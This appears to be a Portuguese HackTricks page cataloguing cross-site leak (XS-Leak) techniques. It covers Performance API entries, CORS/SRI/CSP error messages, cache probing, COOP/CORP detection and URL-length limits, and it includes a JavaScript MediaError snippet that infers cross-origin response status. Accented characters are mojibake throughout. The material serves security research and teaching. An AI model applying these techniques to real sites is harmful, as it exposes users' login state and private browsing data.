{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## T√©cnicas da API de Desempenho

A [`API de Desempenho`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) fornece acesso a informa√ß√µes relacionadas ao desempenho, aprimoradas pelos dados da [`API de Tempo de Recursos`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API), que fornece os tempos de solicita√ß√µes de rede, como a dura√ß√£o, mas quando h√° um cabe√ßalho `Timing-Allow-Origin: *` enviado pelo servidor, o tamanho da transfer√™ncia e o tempo de pesquisa de dom√≠nio tamb√©m s√£o fornecidos.\
Esses dados podem ser acessados usando [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ou [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName). Tamb√©m pode ser usado para obter o tempo de execu√ß√£o usando a diferen√ßa de [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now), no entanto, isso parece ser menos preciso para um fetch do Chrome, pois ele fornece apenas os milissegundos.

Essa API pode ser usada para medir o tempo de uma solicita√ß√£o ou para detectar o uso de X-Frame-Options, pois a p√°gina bloqueada n√£o ser√° adicionada ao objeto `performance` no Chrome.

### Vazamento de Erro

* **M√©todos de Inclus√£o**: Frames, Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** Uma solicita√ß√£o que resulta em erros n√£o criar√° uma entrada de tempo de recurso.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

√â poss√≠vel **diferenciar entre os c√≥digos de status de resposta HTTP** porque as solicita√ß√µes que levam a um **erro** n√£o criam uma entrada de desempenho.

### Erro de Recarregamento de Estilo

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** Devido a um bug do navegador, as solicita√ß√µes que resultam em erros s√£o carregadas duas vezes.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Na t√©cnica anterior, tamb√©m foram identificados dois casos em que bugs do navegador no GC levam ao **carregamento duplicado de recursos quando eles falham ao carregar**. Isso resultar√° em v√°rias entradas na API de Desempenho e, portanto, pode ser detectado.
### Erro de Fus√£o de Solicita√ß√µes

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** Solicita√ß√µes que resultam em erro n√£o podem ser mescladas.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

A t√©cnica foi encontrada em uma tabela no artigo mencionado, mas nenhuma descri√ß√£o da t√©cnica foi encontrada nele. No entanto, voc√™ pode encontrar o c√≥digo-fonte verificando-o em [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Vazamento de P√°gina Vazia

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** Respostas vazias n√£o criam entradas de tempo de recurso.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Um atacante pode detectar se uma solicita√ß√£o resultou em um corpo de resposta HTTP vazio porque **p√°ginas vazias n√£o criam uma entrada de desempenho em alguns navegadores**.

### **Vazamento do XSS-Auditor**

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** Detectar a presen√ßa de elementos espec√≠ficos em uma p√°gina da web com o XSS-Auditor em SA.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

No SA, √© poss√≠vel detectar se o XSSAuditor foi acionado e, assim, vazar informa√ß√µes sens√≠veis. O XSS-Auditor √© um recurso incorporado do SA e do GC (agora removido) projetado para mitigar ataques de Cross-Site Scripting (XSS). Em 2013, Braun e Heiderich \[7] mostraram que o XSS-Auditor pode ser usado para bloquear scripts benignos com falsos positivos. Com base em sua t√©cnica, os pesquisadores exfiltram informa√ß√µes e detectam conte√∫do espec√≠fico em uma p√°gina de origem cruzada. Esses XS-Leaks foram descritos pela primeira vez em um relat√≥rio de bug por Terada e posteriormente em um post de blog por Heyes. No entanto, as t√©cnicas descobertas se aplicam apenas ao XSS-Auditor no GC e n√£o funcionam no SA. Descobrimos que as p√°ginas bloqueadas n√£o criar√£o entradas da API de Desempenho. Isso significa que um atacante ainda pode vazar informa√ß√µes sens√≠veis com o XSS-Auditor no SA.

### Vazamento do X-Frame

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Resumo:** Recursos com o cabe√ßalho X-Frame-Options n√£o criam entrada de tempo de recurso.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Se uma p√°gina **n√£o √© permitida** ser **renderizada** em um **iframe**, ela **n√£o cria uma entrada de desempenho**. Como resultado, um atacante pode detectar o cabe√ßalho de resposta **`X-Frame-Options`**.\
O mesmo acontece se voc√™ usar uma **tag embed**.

### Detec√ß√£o de Download

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** Downloads n√£o criam entradas de tempo de recurso na API de Desempenho.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Semelhante ao XS-Leak descrito, um **recurso que √© baixado** por causa do cabe√ßalho ContentDisposition tamb√©m **n√£o cria uma entrada de desempenho**. Essa t√©cnica funciona em todos os principais navegadores.

### Vazamento de In√≠cio de Redirecionamento

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Redirecionamento
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** A entrada de tempo de recurso vaza o hor√°rio de in√≠cio de um redirecionamento.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Encontramos uma inst√¢ncia de XS-Leak que abusa do comportamento de alguns navegadores que registram muitas informa√ß√µes para solicita√ß√µes de origem cruzada. O padr√£o define um subconjunto de atributos que devem ser definidos como zero para recursos de origem cruzada. No entanto, no **SA**, √© poss√≠vel detectar se o usu√°rio √© **redirecionado** pela p√°gina de destino, consultando a **API de Desempenho** e verificando os dados de tempo **redirectStart**.

### Vazamento de Redirecionamento de Dura√ß√£o

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Redirecionamento
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** A dura√ß√£o das entradas de tempo √© negativa quando ocorre um redirecionamento.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

No GC, a **dura√ß√£o** das solicita√ß√µes que resultam em um **redirecionamento** √© **negativa** e, portanto, pode ser **distingu√≠vel** das solicita√ß√µes que n√£o resultam em um redirecionamento.
### Vazamento da CORP

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo**: Recursos protegidos com CORP n√£o criam entradas de tempo de recurso.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Em alguns casos, a entrada **nextHopProtocol** pode ser usada como t√©cnica de vazamento. No GC, quando o cabe√ßalho **CORP** √© definido, o nextHopProtocol ser√° **vazio**. Observe que o SA n√£o criar√° uma entrada de desempenho para recursos habilitados para CORP.

### Service Worker

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Uso da API
* **Mais informa√ß√µes**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Resumo**: Detectar se um service worker est√° registrado para uma origem espec√≠fica.
* **Exemplo de C√≥digo**:

Os service workers s√£o contextos de script orientados a eventos que s√£o executados em uma origem. Eles s√£o executados em segundo plano de uma p√°gina da web e podem interceptar, modificar e **armazenar em cache recursos** para criar aplicativos da web offline.\
Se um **recurso armazenado em cache** por um **service worker** for acessado por meio de um **iframe**, o recurso ser√° **carregado do cache do service worker**.\
Para detectar se o recurso foi **carregado do cache do service worker**, a API de Desempenho pode ser usada.\
Isso tamb√©m pode ser feito com um ataque de temporiza√ß√£o (verifique o artigo para mais informa√ß√µes).

### Cache

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Resumo**: Detectar se um recurso foi armazenado em cache.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Usando a [API de Desempenho](xs-search.md#performance-api), √© poss√≠vel verificar se um recurso est√° em cache.\
Para mais informa√ß√µes: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)

### Dura√ß√£o da Rede

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Resumo**: √â poss√≠vel obter a dura√ß√£o da rede de uma solicita√ß√£o a partir da API `performance`.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## T√©cnica de Mensagens de Erro

### Erro de M√≠dia

* **M√©todos de Inclus√£o**: Elementos HTML (V√≠deo, √Åudio)
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Resumo**: No FF, √© poss√≠vel vazar com precis√£o o c√≥digo de status de uma solicita√ß√£o de origem cruzada.
* **Exemplo de C√≥digo**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
A propriedade de mensagem da interface **`MediaError`** cont√©m uma **string diferente para recursos que s√£o carregados com sucesso**. Isso permite que um atacante infira o status de resposta para um recurso de origem cruzada.

### Erro de CORS

* **M√©todos de inclus√£o**: Fetch API
* **Diferen√ßa detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumo**: Em SA, as mensagens de erro de CORS vazam a URL completa de redirecionamentos.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Essa t√©cnica permite que um atacante vaze o alvo de um redirecionamento iniciado por um site de origem cruzada.

O CORS permite que recursos da web publicamente acess√≠veis sejam lidos e usados a partir de qualquer site. Nos navegadores baseados em Webkit, √© poss√≠vel **acessar mensagens de erro de CORS quando uma solicita√ß√£o CORS falha**. Um atacante pode enviar uma solicita√ß√£o habilitada para CORS para um site de destino que **redireciona** com base no estado do usu√°rio. Quando o navegador nega a solicita√ß√£o, a **URL completa do redirecionamento de destino √© vazada** na mensagem de erro. Com esse ataque, √© poss√≠vel detectar redirecionamentos, vazar locais de redirecionamento e par√¢metros de consulta sens√≠veis.

### Erro de SRI

* **M√©todos de inclus√£o**: Fetch API
* **Diferen√ßa detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumo**: Em SA, as mensagens de erro de CORS vazam a URL completa de redirecionamentos.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Um atacante pode vazar o tamanho de respostas de origem cruzada devido a **mensagens de erro detalhadas**.

O atributo de integridade define um hash criptogr√°fico pelo qual o navegador pode verificar se um recurso buscado n√£o foi manipulado. Esse mecanismo de seguran√ßa √© chamado de Integridade de Subrecursos (SRI). Ele √© usado para verifica√ß√£o de integridade de recursos servidos por redes de entrega de conte√∫do (CDNs). Para evitar vazamentos de dados, os recursos de origem cruzada devem ser **habilitados para CORS**. Caso contr√°rio, a resposta n√£o √© eleg√≠vel para valida√ß√£o de integridade. Semelhante ao vazamento de erro de CORS XS-Leak, √© poss√≠vel capturar a **mensagem de erro ap√≥s uma solicita√ß√£o fetch com um atributo de integridade falhar**. Um atacante pode for√ßar esse **erro** em qualquer solicita√ß√£o especificando um **valor de hash falso**. Em SA, essa mensagem de erro vaza o comprimento do conte√∫do do recurso solicitado. Um atacante pode usar esse vazamento para detectar diferen√ßas no tamanho da resposta, o que possibilita poderosos ataques XS-Leak.

### Viola√ß√£o/Detec√ß√£o de CSP

* **M√©todos de inclus√£o**: Pop-ups
* **Diferen√ßa detect√°vel**: C√≥digo de status
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Resumo**: Permitindo apenas o site da v√≠tima no CSP, se acessarmos e ele tentar redirecionar para um dom√≠nio diferente, o CSP acionar√° um erro detect√°vel.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Um XS-Leak pode usar o CSP para detectar se um site de origem cruzada foi redirecionado para uma origem diferente. Esse vazamento pode detectar o redirecionamento, mas al√©m disso, o dom√≠nio do destino do redirecionamento tamb√©m vaza. A ideia b√°sica desse ataque √© **permitir o dom√≠nio de destino no site do atacante**. Uma vez que uma solicita√ß√£o √© feita para o dom√≠nio de destino, ele **redireciona** para um dom√≠nio de origem cruzada. O **CSP bloqueia** o acesso a ele e cria um **relat√≥rio de viola√ß√£o usado como t√©cnica de vazamento**. Dependendo do navegador, **esse relat√≥rio pode vazar a localiza√ß√£o de destino do redirecionamento**.\
Navegadores modernos n√£o indicar√£o a URL para a qual foi redirecionado, mas ainda √© poss√≠vel detectar que um redirecionamento de origem cruzada foi acionado.

### Cache

* **M√©todos de inclus√£o**: Frames, Pop-ups
* **Diferen√ßa detect√°vel**: Conte√∫do da p√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Resumo**: Limpe o arquivo do cache. Abra a p√°gina de destino e verifique se o arquivo est√° presente no cache.
* **Exemplo de c√≥digo:**

Os navegadores podem usar um cache compartilhado para todos os sites. Independentemente de sua origem, √© poss√≠vel deduzir se uma p√°gina de destino **solicitou um arquivo espec√≠fico**.

Se uma p√°gina carrega uma imagem apenas se o usu√°rio estiver logado, voc√™ pode **invalidar** o **recurso** (para que n√£o seja mais armazenado em cache, se estiver, consulte os links de mais informa√ß√µes), **realizar uma solicita√ß√£o** que poderia carregar esse recurso e tentar carregar o recurso **com uma solicita√ß√£o inv√°lida** (por exemplo, usando um cabe√ßalho de refer√™ncia muito longo). Se o carregamento do recurso **n√£o acionar nenhum erro**, √© porque ele est√° **em cache**.

### Diretiva CSP

* **M√©todos de inclus√£o**: Frames
* **Diferen√ßa detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Resumo**: As diretivas de cabe√ßalho CSP podem ser sondadas com o atributo CSP do iframe.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Um novo recurso no GC permite que p√°ginas da web proponham um CSP definindo um atributo em um elemento iframe. As diretivas de pol√≠tica s√£o transmitidas juntamente com a solicita√ß√£o HTTP. Normalmente, o conte√∫do incorporado deve permitir explicitamente isso com um cabe√ßalho HTTP, **caso contr√°rio, uma p√°gina de erro √© exibida**. No entanto, se o iframe j√° contiver um CSP e a nova pol√≠tica n√£o for mais restritiva, a p√°gina ser√° exibida normalmente.

Isso permite que um atacante detecte diretivas CSP espec√≠ficas de uma p√°gina de origem cruzada, se for poss√≠vel **detectar a p√°gina de erro**. Embora esse bug esteja marcado como corrigido, encontramos uma **nova t√©cnica de vazamento que pode detectar a p√°gina de erro, porque o problema subjacente nunca foi corrigido**.
### **CORP**

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Resumo**: Recurso protegido com CORP gera um erro ao ser buscado.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

O cabe√ßalho CORP √© um recurso de seguran√ßa relativamente novo na plataforma web que, quando definido, **bloqueia solicita√ß√µes de origem cruzada sem-cors para o recurso especificado**. A presen√ßa do cabe√ßalho pode ser detectada, pois um recurso protegido com CORP **gerar√° um erro ao ser buscado**.

### CORB

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Resumo**: O CORB pode permitir que os atacantes detectem a presen√ßa do cabe√ßalho `nosniff` na solicita√ß√£o.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Verifique o link de mais informa√ß√µes para obter mais detalhes sobre o ataque.

### Erro CORS na m√° configura√ß√£o de Reflex√£o de Origem <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Resumo**: Se o cabe√ßalho de Origem for refletido no cabe√ßalho `Access-Control-Allow-Origin`, √© poss√≠vel verificar se um recurso j√° est√° em cache.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Caso o cabe√ßalho de **Origem** seja **refletido** no cabe√ßalho `Access-Control-Allow-Origin`, um atacante pode abusar desse comportamento para tentar **buscar** o **recurso** no modo **CORS**. Se **nenhum erro** for disparado, significa que ele foi **corretamente obtido da web**. Se um erro for **disparado**, significa que ele foi **acessado a partir do cache** (o erro ocorre porque o cache salva uma resposta com um cabe√ßalho CORS permitindo o dom√≠nio original e n√£o o dom√≠nio do atacante).\
Observe que, se a origem n√£o for refletida, mas um caractere curinga for usado (`Access-Control-Allow-Origin: *`), isso n√£o funcionar√°.

## T√©cnica de Atributos Leg√≠veis

### Redirecionamento Fetch

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Resumo**: GC e SA permitem verificar o tipo de resposta (`opaque-redirect`) ap√≥s o t√©rmino do redirecionamento.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Ao enviar uma solicita√ß√£o usando a Fetch API com `redirect: "manual"` e outros par√¢metros, √© poss√≠vel ler o atributo `response.type` e, se for igual a `opaqueredirect`, significa que a resposta foi um redirecionamento.

### COOP

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Resumo**: P√°ginas protegidas por COOP n√£o podem ser acessadas.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Um atacante pode vazar se o cabe√ßalho Cross-Origin Opener Policy (COOP) estiver dispon√≠vel em uma resposta HTTP de origem cruzada.

As aplica√ß√µes web podem implantar o cabe√ßalho de resposta COOP para evitar que outros sites obtenham refer√™ncias de janela arbitr√°rias para a aplica√ß√£o. No entanto, esse **cabe√ßalho pode ser facilmente detectado** ao tentar ler a **refer√™ncia `contentWindow`**. Se um site implantar **COOP em um estado espec√≠fico**, essa propriedade (`opener`) ser√° **indefinida**, **caso contr√°rio**, ser√° **definida**.

### Comprimento M√°ximo de URL - Lado do Servidor

* **M√©todos de Inclus√£o**: Fetch API, Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status / Conte√∫do
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Resumo**: Detectar diferen√ßas nas respostas devido ao comprimento da resposta de redirecionamento que pode ser muito grande, fazendo com que o servidor responda com um erro e gere um alerta.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Se um redirecionamento do lado do servidor usar **entrada do usu√°rio dentro do redirecionamento** e **dados extras**, √© poss√≠vel detectar esse comportamento porque geralmente os **servidores** t√™m um **limite de comprimento da solicita√ß√£o**. Se os **dados do usu√°rio** tiverem **esse comprimento - 1**, porque o **redirecionamento** est√° usando **esses dados** e **adicionando** algo **extra**, ele disparar√° um **erro detect√°vel por meio de Eventos de Erro**.

Se voc√™ de alguma forma puder definir cookies para um usu√°rio, tamb√©m poder√° realizar esse ataque **definindo cookies suficientes** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) para que, com o **aumento do tamanho da resposta** correta, seja disparado um **erro**. Nesse caso, lembre-se de que, se voc√™ disparar essa solicita√ß√£o a partir do mesmo site, `<script>` enviar√° automaticamente os cookies (para que voc√™ possa verificar os erros).\
Um exemplo de **cookie bomba + XS-Search** pode ser encontrado na solu√ß√£o pretendida deste artigo: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ou estar no mesmo contexto geralmente √© necess√°rio para esse tipo de ataque.
### Comprimento M√°ximo de URL - Lado do Cliente

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: C√≥digo de Status / Conte√∫do
* **Mais informa√ß√µes**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Resumo**: Detecte diferen√ßas nas respostas devido ao comprimento da resposta de redirecionamento que pode ser muito grande para uma solicita√ß√£o, de modo que uma diferen√ßa possa ser notada.
* **Exemplo de C√≥digo**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

De acordo com a [documenta√ß√£o do Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), o comprimento m√°ximo de URL do Chrome √© de 2MB.

> Em geral, a _plataforma web_ n√£o tem limites para o comprimento de URLs (embora 2^31 seja um limite comum). O _Chrome_ limita URLs a um comprimento m√°ximo de **2MB** por raz√µes pr√°ticas e para evitar problemas de nega√ß√£o de servi√ßo na comunica√ß√£o entre processos.

Portanto, se a **URL de redirecionamento respondida for maior em um dos casos**, √© poss√≠vel fazer com que ela redirecione com uma **URL maior que 2MB** para atingir o **limite de comprimento**. Quando isso acontece, o Chrome mostra uma p√°gina **`about:blank#blocked`**.

A **diferen√ßa percept√≠vel** √© que, se o **redirecionamento** foi **conclu√≠do**, `window.origin` gera um **erro** porque uma origem cruzada n√£o pode acessar essa informa√ß√£o. No entanto, se o **limite** foi atingido e a p√°gina carregada foi **`about:blank#blocked`**, a **`origin`** da janela permanece a do **pai**, que √© uma informa√ß√£o **acess√≠vel**.

Todas as informa√ß√µes extras necess√°rias para atingir os **2MB** podem ser adicionadas por meio de um **hash** na URL inicial para que sejam **usadas no redirecionamento**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### M√°ximo de Redirecionamentos

* **M√©todos de Inclus√£o**: Fetch API, Frames
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
